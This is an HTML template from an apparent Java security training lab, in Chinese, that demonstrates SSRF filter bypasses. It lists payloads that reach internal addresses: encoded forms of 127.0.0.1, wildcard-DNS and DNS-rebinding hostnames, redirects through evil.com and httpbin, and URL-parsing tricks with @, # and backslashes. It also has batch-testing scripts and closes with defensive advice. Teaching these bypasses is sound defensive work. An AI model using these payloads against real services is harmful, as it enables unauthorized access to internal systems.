<!DOCTYPE html>
<html lang="zh-CN" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF绕过技术演示 - Java Security Lab</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css" rel="stylesheet">
    <style>
        .vulnerability-demo { background-color: #fff3cd; border: 1px solid #ffeaa7; }
        .safe-demo { background-color: #d1ecf1; border: 1px solid #bee5eb; }
        .payload-box { background-color: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
        .result-box { min-height: 150px; border: 1px solid #dee2e6; padding: 10px; background-color: #f8f9fa; font-family: monospace; white-space: pre-wrap; }
        .attack-input { font-family: monospace; }
        .bypass-card { border-left: 4px solid #dc3545; }
        .technique-badge { font-size: 0.8em; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="/">Java Security Lab</a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="/ssrf">SSRF主页</a>
                <a class="nav-link" href="/">返回首页</a>
            </div>
        </div>
    </nav>

    <div class="container mt-4">
        <div class="row">
            <div class="col-12">
                <h1 class="mb-4">SSRF绕过技术演示</h1>
                
                <!-- 说明部分 -->
                <div class="alert alert-danger">
                    <h5><i class="fas fa-exclamation-triangle"></i> SSRF绕过技术</h5>
                    <p>当应用实施了基础的SSRF防护时，攻击者可以使用各种绕过技术来突破防护机制。</p>
                    <p><strong>绕过目标：</strong> IP黑名单、域名白名单、协议限制等</p>
                    <p><strong>技术类型：</strong> 编码绕过、重定向绕过、DNS绕过、协议绕过等</p>
                </div>

                <!-- 绕过测试工具 -->
                <div class="card vulnerability-demo mb-4">
                    <div class="card-header bg-warning">
                        <h5 class="mb-0"><i class="fas fa-bomb"></i> SSRF绕过测试工具</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="bypassUrl" class="form-label">绕过载荷：</label>
                                    <input type="text" class="form-control attack-input" id="bypassUrl" 
                                           placeholder="http://127.0.0.1" value="http://127.0.0.1">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="bypassType" class="form-label">绕过类型：</label>
                                    <select class="form-select" id="bypassType">
                                        <option value="ip_encoding">IP编码绕过</option>
                                        <option value="domain_bypass">域名绕过</option>
                                        <option value="redirect">重定向绕过</option>
                                        <option value="dns_rebinding">DNS重绑定</option>
                                        <option value="protocol_bypass">协议绕过</option>
                                        <option value="url_parsing">URL解析差异</option>
                                    </select>
                                </div>
                                
                                <div class="mb-3">
                                    <button type="button" class="btn btn-danger" onclick="testBypass()">
                                        <i class="fas fa-bomb"></i> 测试绕过
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm ms-2" onclick="clearBypassResult()">
                                        清除结果
                                    </button>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <h6>绕过测试结果：</h6>
                                <div id="bypassResult" class="result-box">
                                    选择绕过类型并点击"测试绕过"查看结果...
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 绕过技术详解 -->
                <div class="row mb-4">
                    <div class="col-md-6">
                        <div class="card bypass-card mb-3">
                            <div class="card-header">
                                <h6><i class="fas fa-code"></i> IP编码绕过 <span class="badge bg-danger technique-badge">高危</span></h6>
                            </div>
                            <div class="card-body">
                                <p><strong>原理：</strong> 使用不同的IP编码格式绕过黑名单检测</p>
                                <h6>绕过载荷：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://2130706433/</code> - 十进制编码 (127.0.0.1)
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://0x7f000001/</code> - 十六进制编码
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://017700000001/</code> - 八进制编码
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://127.1/</code> - 省略零
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://[::1]/</code> - IPv6 localhost
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-danger btn-sm" onclick="setBypassUrl('http://2130706433/')">
                                        测试十进制编码
                                    </button>
                                    <button class="btn btn-outline-danger btn-sm" onclick="setBypassUrl('http://0x7f000001/')">
                                        测试十六进制编码
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="card bypass-card mb-3">
                            <div class="card-header">
                                <h6><i class="fas fa-globe"></i> 域名绕过 <span class="badge bg-warning technique-badge">中危</span></h6>
                            </div>
                            <div class="card-body">
                                <p><strong>原理：</strong> 使用特殊域名或子域名绕过白名单</p>
                                <h6>绕过载荷：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://localhost.evil.com/</code> - 子域名绕过
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://127.0.0.1.nip.io/</code> - 通配符DNS
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://127.0.0.1.xip.io/</code> - xip.io服务
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://localtest.me/</code> - 指向127.0.0.1
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-warning btn-sm" onclick="setBypassUrl('http://127.0.0.1.nip.io/')">
                                        测试nip.io绕过
                                    </button>
                                    <button class="btn btn-outline-warning btn-sm" onclick="setBypassUrl('http://localtest.me/')">
                                        测试localtest.me
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <div class="card bypass-card mb-3">
                            <div class="card-header">
                                <h6><i class="fas fa-exchange-alt"></i> 重定向绕过 <span class="badge bg-danger technique-badge">高危</span></h6>
                            </div>
                            <div class="card-body">
                                <p><strong>原理：</strong> 通过HTTP重定向绕过URL检查</p>
                                <h6>绕过载荷：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://httpbin.org/redirect-to?url=http://127.0.0.1</code>
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://bit.ly/shortened-url</code> - 短链接
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://evil.com/redirect.php?target=127.0.0.1</code>
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-danger btn-sm" onclick="generateRedirectUrl()">
                                        生成重定向URL
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="card bypass-card mb-3">
                            <div class="card-header">
                                <h6><i class="fas fa-network-wired"></i> DNS重绑定 <span class="badge bg-danger technique-badge">高危</span></h6>
                            </div>
                            <div class="card-body">
                                <p><strong>原理：</strong> 利用DNS解析的时间差进行攻击</p>
                                <h6>攻击步骤：</h6>
                                <ol class="small">
                                    <li>域名首次解析到外部IP（通过检查）</li>
                                    <li>短TTL后解析到内网IP</li>
                                    <li>实际请求访问内网服务</li>
                                </ol>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://rebind.network/</code> - DNS重绑定服务
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://A.B.C.D.1time.127.0.0.1.1time.repeat.rebind.network/</code>
                                </div>
                                
                                <div class="mt-2">
                                    <button class="btn btn-outline-danger btn-sm" onclick="generateRebindUrl()">
                                        生成重绑定URL
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- URL解析差异绕过 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>URL解析差异绕过技术</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <h6>特殊字符绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://127.0.0.1%2523@evil.com/</code> - URL编码绕过
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://evil.com#@127.0.0.1/</code> - 片段标识符
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://127.0.0.1@evil.com/</code> - 用户信息绕过
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://evil.com\@127.0.0.1/</code> - 反斜杠绕过
                                </div>
                                
                                <h6>Unicode绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/</code> - Unicode字符
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://localhost%E2%80%8B.evil.com/</code> - 零宽字符
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <h6>协议绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>HTTP://127.0.0.1/</code> - 大写协议
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>htTp://127.0.0.1/</code> - 混合大小写
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http:/127.0.0.1/</code> - 缺少斜杠
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http:///127.0.0.1/</code> - 多余斜杠
                                </div>
                                
                                <h6>端口绕过：</h6>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://127.0.0.1:80/</code> - 显式端口
                                </div>
                                <div class="payload-box p-2 mb-2">
                                    <code>http://127.0.0.1:0080/</code> - 零填充端口
                                </div>
                            </div>
                        </div>
                        
                        <div class="mt-3">
                            <button class="btn btn-outline-primary btn-sm" onclick="testAllBypasses()">
                                <i class="fas fa-play"></i> 批量测试绕过
                            </button>
                            <button class="btn btn-outline-success btn-sm ms-2" onclick="generateBypassReport()">
                                <i class="fas fa-file-alt"></i> 生成绕过报告
                            </button>
                        </div>
                    </div>
                </div>

                <!-- 绕过载荷生成器 -->
                <div class="card mb-4">
                    <div class="card-header">
                        <h5>绕过载荷生成器</h5>
                    </div>
                    <div class="card-body">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="mb-3">
                                    <label for="targetIp" class="form-label">目标IP：</label>
                                    <input type="text" class="form-control" id="targetIp" value="127.0.0.1" placeholder="127.0.0.1">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="targetPort" class="form-label">目标端口：</label>
                                    <input type="number" class="form-control" id="targetPort" value="80" placeholder="80">
                                </div>
                                
                                <div class="mb-3">
                                    <label for="bypassMethods" class="form-label">绕过方法：</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="ipEncoding" checked>
                                        <label class="form-check-label" for="ipEncoding">IP编码绕过</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="domainBypass" checked>
                                        <label class="form-check-label" for="domainBypass">域名绕过</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="urlParsing" checked>
                                        <label class="form-check-label" for="urlParsing">URL解析差异</label>
                                    </div>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="protocolBypass">
                                        <label class="form-check-label" for="protocolBypass">协议绕过</label>
                                    </div>
                                </div>
                                
                                <button type="button" class="btn btn-primary" onclick="generateBypassPayloads()">
                                    <i class="fas fa-cogs"></i> 生成绕过载荷
                                </button>
                            </div>
                            
                            <div class="col-md-6">
                                <h6>生成的绕过载荷：</h6>
                                <div id="generatedPayloads" class="result-box">
                                    配置参数并点击"生成绕过载荷"...
                                </div>
                                
                                <div class="mt-3">
                                    <button type="button" class="btn btn-success btn-sm" onclick="copyAllPayloads()">
                                        <i class="fas fa-copy"></i> 复制所有载荷
                                    </button>
                                    <button type="button" class="btn btn-outline-primary btn-sm ms-2" onclick="testGeneratedPayloads()">
                                        <i class="fas fa-play"></i> 测试生成载荷
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 防护建议 -->
                <div class="alert alert-success">
                    <h5><i class="fas fa-shield-alt"></i> 绕过防护建议</h5>
                    <div class="row">
                        <div class="col-md-6">
                            <h6>输入规范化：</h6>
                            <ul>
                                <li>URL标准化处理</li>
                                <li>IP地址规范化</li>
                                <li>Unicode规范化</li>
                                <li>大小写统一处理</li>
                                <li>特殊字符过滤</li>
                            </ul>
                            
                            <h6>多层验证：</h6>
                            <ul>
                                <li>请求前验证</li>
                                <li>DNS解析后验证</li>
                                <li>连接建立后验证</li>
                                <li>重定向跟踪限制</li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h6>网络层防护：</h6>
                            <ul>
                                <li>DNS服务器配置</li>
                                <li>防火墙规则</li>
                                <li>网络隔离</li>
                                <li>代理服务器</li>
                                <li>流量监控</li>
                            </ul>
                            
                            <h6>应用层防护：</h6>
                            <ul>
                                <li>严格的白名单机制</li>
                                <li>请求头验证</li>
                                <li>响应内容检查</li>
                                <li>超时和重试限制</li>
                                <li>错误处理优化</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
    
    <script>
        let generatedPayloadsList = [];
        
        // 设置绕过URL
        function setBypassUrl(url) {
            document.getElementById('bypassUrl').value = url;
        }
        
        // 测试绕过
        function testBypass() {
            const url = document.getElementById('bypassUrl').value;
            const type = document.getElementById('bypassType').value;
            
            if (!url.trim()) {
                alert('请输入绕过载荷');
                return;
            }
            
            const resultDiv = document.getElementById('bypassResult');
            resultDiv.textContent = '测试绕过中...';
            
            fetch('/ssrf/bypass/test', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `url=${encodeURIComponent(url)}&type=${type}`
            })
            .then(response => response.json())
            .then(data => {
                let result = `绕过载荷: ${data.url}\n`;
                result += `绕过类型: ${data.bypassType}\n`;
                result += `执行时间: ${data.executionTime}ms\n`;
                result += `绕过状态: ${data.bypassSuccess ? '成功' : '失败'}\n\n`;
                
                if (data.bypassAnalysis) {
                    const analysis = data.bypassAnalysis;
                    result += `绕过分析:\n`;
                    result += `  检测方法: ${analysis.detectionMethod}\n`;
                    result += `  绕过技术: ${analysis.bypassTechnique}\n`;
                    result += `  成功原因: ${analysis.successReason}\n`;
                    result += `  风险等级: ${analysis.riskLevel}\n\n`;
                }
                
                if (data.requestResult) {
                    result += `请求结果:\n`;
                    result += `  状态码: ${data.requestResult.statusCode}\n`;
                    result += `  响应大小: ${data.requestResult.responseSize} bytes\n`;
                    if (data.requestResult.responsePreview) {
                        result += `  响应预览: ${data.requestResult.responsePreview}\n`;
                    }
                }
                
                if (data.error) {
                    result += `错误信息: ${data.error}`;
                }
                
                resultDiv.textContent = result;
            })
            .catch(error => {
                resultDiv.textContent = '测试失败: ' + error;
            });
        }
        
        // 生成重定向URL
        function generateRedirectUrl() {
            const target = '127.0.0.1';
            const redirectUrl = `http://httpbin.org/redirect-to?url=http://${target}`;
            document.getElementById('bypassUrl').value = redirectUrl;
            document.getElementById('bypassType').value = 'redirect';
        }
        
        // 生成DNS重绑定URL
        function generateRebindUrl() {
            const target = '127.0.0.1';
            const rebindUrl = `http://A.${target}.1time.repeat.rebind.network/`;
            document.getElementById('bypassUrl').value = rebindUrl;
            document.getElementById('bypassType').value = 'dns_rebinding';
        }
        
        // 生成绕过载荷
        function generateBypassPayloads() {
            const ip = document.getElementById('targetIp').value;
            const port = document.getElementById('targetPort').value;
            const ipEncoding = document.getElementById('ipEncoding').checked;
            const domainBypass = document.getElementById('domainBypass').checked;
            const urlParsing = document.getElementById('urlParsing').checked;
            const protocolBypass = document.getElementById('protocolBypass').checked;
            
            if (!ip) {
                alert('请输入目标IP');
                return;
            }
            
            const resultDiv = document.getElementById('generatedPayloads');
            resultDiv.textContent = '生成绕过载荷中...';
            
            fetch('/ssrf/bypass/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `ip=${encodeURIComponent(ip)}&port=${port}&ipEncoding=${ipEncoding}&domainBypass=${domainBypass}&urlParsing=${urlParsing}&protocolBypass=${protocolBypass}`
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    generatedPayloadsList = data.payloads;
                    let result = `目标: ${data.targetIp}:${data.targetPort}\n`;
                    result += `生成时间: ${new Date().toLocaleString()}\n`;
                    result += `载荷数量: ${data.payloads.length}\n\n`;
                    
                    data.payloads.forEach((payload, index) => {
                        result += `${index + 1}. [${payload.type}] ${payload.url}\n`;
                        if (payload.description) {
                            result += `   描述: ${payload.description}\n`;
                        }
                        result += '\n';
                    });
                    
                    resultDiv.textContent = result;
                } else {
                    resultDiv.textContent = '生成失败: ' + data.error;
                }
            })
            .catch(error => {
                resultDiv.textContent = '生成失败: ' + error;
            });
        }
        
        // 批量测试绕过
        function testAllBypasses() {
            if (generatedPayloadsList.length === 0) {
                alert('请先生成绕过载荷');
                return;
            }
            
            const resultDiv = document.getElementById('bypassResult');
            resultDiv.textContent = '批量测试绕过中...\n';
            
            let testResults = [];
            let completedTests = 0;
            
            generatedPayloadsList.forEach((payload, index) => {
                fetch('/ssrf/bypass/test', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `url=${encodeURIComponent(payload.url)}&type=${payload.type}`
                })
                .then(response => response.json())
                .then(data => {
                    testResults[index] = data;
                    completedTests++;
                    
                    if (completedTests === generatedPayloadsList.length) {
                        displayBatchResults(testResults);
                    }
                })
                .catch(error => {
                    testResults[index] = { error: error.toString() };
                    completedTests++;
                    
                    if (completedTests === generatedPayloadsList.length) {
                        displayBatchResults(testResults);
                    }
                });
            });
        }
        
        // 显示批量测试结果
        function displayBatchResults(results) {
            const resultDiv = document.getElementById('bypassResult');
            let output = '批量测试结果:\n\n';
            
            let successCount = 0;
            results.forEach((result, index) => {
                const payload = generatedPayloadsList[index];
                output += `${index + 1}. [${payload.type}] ${result.bypassSuccess ? '✓' : '✗'}\n`;
                output += `   URL: ${payload.url}\n`;
                if (result.bypassSuccess) {
                    successCount++;
                    output += `   状态: 绕过成功\n`;
                } else {
                    output += `   状态: 绕过失败\n`;
                }
                if (result.error) {
                    output += `   错误: ${result.error}\n`;
                }
                output += '\n';
            });
            
            output += `总结: ${successCount}/${results.length} 个载荷绕过成功`;
            resultDiv.textContent = output;
        }
        
        // 复制所有载荷
        function copyAllPayloads() {
            if (generatedPayloadsList.length === 0) {
                alert('请先生成绕过载荷');
                return;
            }
            
            const payloads = generatedPayloadsList.map(p => p.url).join('\n');
            navigator.clipboard.writeText(payloads).then(() => {
                alert('所有载荷已复制到剪贴板');
            }).catch(err => {
                console.error('复制失败:', err);
            });
        }
        
        // 测试生成的载荷
        function testGeneratedPayloads() {
            if (generatedPayloadsList.length === 0) {
                alert('请先生成绕过载荷');
                return;
            }
            
            // 使用第一个载荷进行测试
            const firstPayload = generatedPayloadsList[0];
            document.getElementById('bypassUrl').value = firstPayload.url;
            document.getElementById('bypassType').value = firstPayload.type;
            testBypass();
        }
        
        // 生成绕过报告
        function generateBypassReport() {
            fetch('/ssrf/bypass/report', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    const reportWindow = window.open('', '_blank');
                    reportWindow.document.write(`
                        <html>
                        <head><title>SSRF绕过技术报告</title></head>
                        <body>
                        <h1>SSRF绕过技术报告</h1>
                        <pre>${data.report}</pre>
                        </body>
                        </html>
                    `);
                } else {
                    alert('生成报告失败: ' + data.error);
                }
            })
            .catch(error => {
                alert('生成报告失败: ' + error);
            });
        }
        
        // 清除结果
        function clearBypassResult() {
            document.getElementById('bypassResult').textContent = '选择绕过类型并点击"测试绕过"查看结果...';
        }
    </script>
</body>
</html>